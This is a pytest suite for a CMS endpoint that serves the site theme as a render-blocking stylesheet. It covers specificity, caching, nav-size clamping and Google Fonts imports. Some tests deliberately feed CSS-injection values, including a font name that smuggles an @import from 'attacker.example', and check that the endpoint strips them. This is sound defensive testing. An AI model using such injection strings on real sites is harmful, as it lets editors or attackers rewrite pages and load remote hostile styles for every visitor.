"""
The theme as a render-blocking stylesheet.

This endpoint exists to remove a flash, and the properties that matter are the ones that
decide whether the flash comes back:

  * it must WIN over the defaults in index.css, whichever order the two stylesheets are
    injected in — the bundler puts the app's CSS after this link, so equal specificity
    would silently lose and the endpoint would do nothing;
  * a publish must be visible on the next load, or a cached stale palette replaces the
    flash with something worse;
  * it must be public, because it is linked from the document by every visitor.
"""
import pytest
import requests

from support import API, TIMEOUT, db

# One worker, in order. Every test here mutates the single published theme document, so
# run in parallel they invalidate each other's ETags and the freshness assertions become
# a race rather than a check.
pytestmark = [pytest.mark.xdist_group("test_theme_css")]


def _published(**colors):
    db.cms_theme.update_one(
        {"doc_id": "theme_current"},
        {"$set": {f"published.colors.{k}": v for k, v in colors.items()}},
    )


def _published_fonts(**families):
    db.cms_theme.update_one(
        {"doc_id": "theme_current"},
        {"$set": {f"published.fonts.{k}": v for k, v in families.items()}},
    )


def _current_fonts():
    return dict(db.cms_theme.find_one({"doc_id": "theme_current"})["published"].get("fonts") or {})


def _css():
    r = requests.get(f"{API}/cms/theme.css", timeout=TIMEOUT)
    assert r.status_code == 200, r.text
    return r


class TestItIsAStylesheet:

    def test_it_is_served_as_css(self):
        r = _css()
        assert r.headers["content-type"].startswith("text/css")

    def test_it_needs_no_session(self):
        # Linked from <head> on every public page, so a 401 here is a broken site.
        r = requests.get(f"{API}/cms/theme.css", timeout=TIMEOUT)
        assert r.status_code == 200

    def test_it_outranks_the_defaults_rather_than_relying_on_order(self):
        """`:root:root`, not `:root`.

        index.css declares the same properties as defaults and is injected AFTER this
        link — in the built output the app's stylesheet is literally the next tag. At
        equal specificity the defaults would win on source order and this endpoint would
        change nothing at all.
        """
        body = _css().text
        assert ":root:root" in body
        assert "\n:root {" not in body


class TestItCarriesTheTheme:

    def test_the_published_colours_are_in_it(self):
        before = db.cms_theme.find_one({"doc_id": "theme_current"})["published"]["colors"]
        try:
            _published(bg="#0B2E13", accent="#00FF88")
            body = _css().text
            assert "--bg: #0B2E13;" in body
            assert "--accent: #00FF88;" in body
        finally:
            _published(bg=before["bg"], accent=before["accent"])

    def test_tailwind_gets_the_bare_channels_too(self):
        """rgb(var(--x) / a) needs "r g b", not a hex — the ramp in index.css is built
        on it, so a colour without channels renders as a broken ramp."""
        before = db.cms_theme.find_one({"doc_id": "theme_current"})["published"]["colors"]
        try:
            _published(accent="#1166FF")
            assert "--accent-rgb: 17 102 255;" in _css().text
        finally:
            _published(accent=before["accent"])

    def test_a_colour_cannot_smuggle_css_out_of_its_declaration(self):
        """A `}` in a colour field would end the rule and let an editor write arbitrary
        CSS into every page. Colours need none of those characters."""
        before = db.cms_theme.find_one({"doc_id": "theme_current"})["published"]["colors"]
        try:
            _published(bg="#000} body{display:none} :root{--x:")
            body = _css().text
            assert "display:none" not in body
            assert body.count("{") == body.count("}")
        finally:
            _published(bg=before["bg"])


class TestFreshness:

    def test_an_unchanged_theme_revalidates_cheaply(self):
        etag = _css().headers["etag"]
        r = requests.get(f"{API}/cms/theme.css", headers={"If-None-Match": etag}, timeout=TIMEOUT)
        assert r.status_code == 304

    def test_publishing_invalidates_it_immediately(self):
        before = db.cms_theme.find_one({"doc_id": "theme_current"})["published"]["colors"]
        try:
            etag = _css().headers["etag"]
            _published(accent="#ABCDEF")
            # A stale palette served from cache would be a worse bug than the flash this
            # endpoint replaces, so the same conditional request must now miss.
            r = requests.get(f"{API}/cms/theme.css", headers={"If-None-Match": etag}, timeout=TIMEOUT)
            assert r.status_code == 200
            assert "--accent: #ABCDEF;" in r.text
        finally:
            _published(accent=before["accent"])


class TestTheNavSize:
    """The header nav's type size is a theme value, not a fixed class.

    How big the menu should be depends on how many items it holds and how long their
    labels are — both of which an editor changes and neither of which is knowable when
    the class is written. The value lands in a stylesheet every visitor loads, so the
    only thing that really matters here is that it cannot be set to something that
    breaks the header the CMS is reached through.
    """

    @staticmethod
    def _set(value):
        # A site setting now, not a theme value — it sits with the header's other
        # control. It still SHIPS in theme.css, because the stylesheet is
        # render-blocking and the nav has to be the right size in the first paint.
        db.site_settings.update_one({"_id": "site"}, {"$set": {"nav_size": value}}, upsert=True)

    @staticmethod
    def _unset():
        db.site_settings.update_one({"_id": "site"}, {"$unset": {"nav_size": ""}})

    def test_it_is_emitted_as_a_variable(self):
        self._set(18)
        assert "--nav-size: 18px;" in _css().text

    def test_an_absurd_value_is_clamped_not_honoured(self):
        """A nav at 200px pushes the header off the page, and the CMS that would undo it
        is reached through that header."""
        self._set(400)
        assert "--nav-size: 32px;" in _css().text
        self._set(1)
        assert "--nav-size: 8px;" in _css().text

    def test_junk_is_dropped_rather_than_written_into_the_stylesheet(self):
        for bad in ("18px; } body { display:none", None, "abc", {"n": 1}):
            self._set(bad)
            css = _css().text
            assert "display:none" not in css
            if bad is not None:
                assert "--nav-size: abc" not in css

    def test_it_falls_back_to_the_shipped_size(self):
        """Unset means the built-in 11px rather than nothing: the class still carries the
        same fallback, so the two agree either way."""
        self._unset()
        assert "--nav-size: 11px;" in _css().text


class TestItAsksGoogleForTheFamiliesGoogleHasToServe:
    """The five seconds this endpoint took off the first paint.

    The theme names its families, and until this existed the browser only learned them
    from JavaScript: the app booted, ThemeLoader fetched /cms/theme as JSON, applyTheme
    called ensureFontLoaded, and only then was a <link> to Google appended. Measured on
    the beta deploy, the request for the site's own display face started at t=5117ms.

    This stylesheet is render-blocking and already knows the name, so it asks.
    """

    def setup_method(self):
        self._before = _current_fonts()

    def teardown_method(self):
        db.cms_theme.update_one(
            {"doc_id": "theme_current"}, {"$set": {"published.fonts": self._before}}
        )

    def test_a_google_family_is_imported(self):
        _published_fonts(display="Archivo")
        body = _css().text
        assert "fonts.googleapis.com/css2?family=Archivo" in body

    def test_the_import_comes_before_any_rule(self):
        """CSS drops an @import that follows a rule, so the position IS the feature."""
        _published_fonts(display="Archivo")
        body = _css().text
        assert body.lstrip().startswith("@import"), body[:120]
        assert body.index("@import") < body.index(":root:root")

    def test_a_space_in_the_name_survives_as_a_url(self):
        _published_fonts(display="Space Grotesk")
        body = _css().text
        # Encoded, not raw: a bare space would end the url() token early.
        assert "family=Space%20Grotesk" in body
        assert "family=Space Grotesk" not in body

    def test_the_self_hosted_families_are_never_asked_for(self):
        """index.css already carries Manrope and IBM Plex Mono from @fontsource, and
        Google does not serve Clash Display at all — asking 404s."""
        _published_fonts(display="Clash Display", body="Manrope", mono="IBM Plex Mono")
        body = _css().text
        assert "fonts.googleapis.com" not in body

    def test_one_import_per_family_rather_than_one_combined_request(self):
        """Google's CSS2 API fails the WHOLE request when any single family in it is
        unknown. Combined, one bad name in the CMS would strip the type off the site."""
        _published_fonts(display="Archivo", body="Inter", mono="Roboto Mono")
        body = _css().text
        assert body.count("@import") == 3

    def test_a_family_named_twice_is_asked_for_once(self):
        _published_fonts(display="Archivo", body="Archivo", mono="Archivo")
        assert _css().text.count("@import") == 1

    def test_the_weights_match_what_the_js_path_asks_for(self):
        """Identical URLs, so the <link> ensureFontLoaded still appends is served from
        cache rather than fetching a second, differently-weighted copy."""
        _published_fonts(display="Archivo")
        assert "wght@300;400;500;600;700;800;900&display=swap" in _css().text

    def test_a_name_that_could_not_be_a_family_is_never_turned_into_a_request(self):
        """FAMILY_RE gates the URL, the same way it gates an upload's family name.

        The name still appears in the `--font-display` declaration, where _css_value has
        stripped the quote, the colon, the semicolon and the @ that would be needed to
        break out of the string — so it sits there as inert text. That is the existing,
        checked behaviour of the declaration path. What must not happen is this endpoint
        turning an editor's field into an outbound request, which is what an @import is.
        """
        _published_fonts(display='Evil"); @import url("//attacker.example/x.css")')
        body = _css().text
        assert "@import" not in body
        # Inert inside the quoted value, and specifically not a second rule.
        assert 'url("//attacker.example' not in body
